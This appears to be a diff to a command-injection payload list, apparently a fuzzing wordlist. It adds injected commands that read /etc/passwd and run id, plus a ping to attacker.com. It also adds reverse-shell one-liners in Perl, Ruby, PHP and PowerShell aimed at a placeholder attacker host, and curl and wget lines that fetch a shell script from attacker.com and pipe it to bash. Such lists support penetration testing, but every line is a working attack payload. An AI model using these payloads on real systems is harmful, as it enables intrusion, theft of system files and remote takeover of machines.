@@ -14,6 +14,7 @@
 && pwd
 ; cat /etc/passwd
 | cat /etc/passwd
+`cat /etc/passwd`
 && cat /etc/passwd
 ; nc -e /bin/sh attacker_ip attacker_port
 | nc -e /bin/sh attacker_ip attacker_port
@@ -24,3 +25,23 @@
 ; python -c 'import pty; pty.spawn("/bin/sh")'
 | python -c 'import pty; pty.spawn("/bin/sh")'
 && python -c 'import pty; pty.spawn("/bin/sh")'
+`cat /etc/passwd`
+$(cat /etc/passwd)
+;system('cat /etc/passwd')
+;exec('cat /etc/passwd')
+;/usr/bin/id
+|/usr/bin/id
+`/usr/bin/id`
+$(/usr/bin/id)
+;system('/usr/bin/id')
+;exec('/usr/bin/id')
+%0a ping -c 1 attacker.com %0a
+|timeout /t 5
+`timeout /t 5`
+;timeout /t 5
+perl -e 'use Socket;$i="attacker_ip";$p=attacker_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+ruby -rsocket -e'f=TCPSocket.open("attacker_ip",attacker_port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+php -r '$sock=fsockopen("attacker_ip",attacker_port);exec("/bin/sh -i <&3 >&3 2>&3");'
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("attacker_ip",attacker_port)
+;curl http://attacker.com/shell.txt|bash
+|wget http://attacker.com/shell.txt -O /tmp/shell.sh;bash /tmp/shell.sh
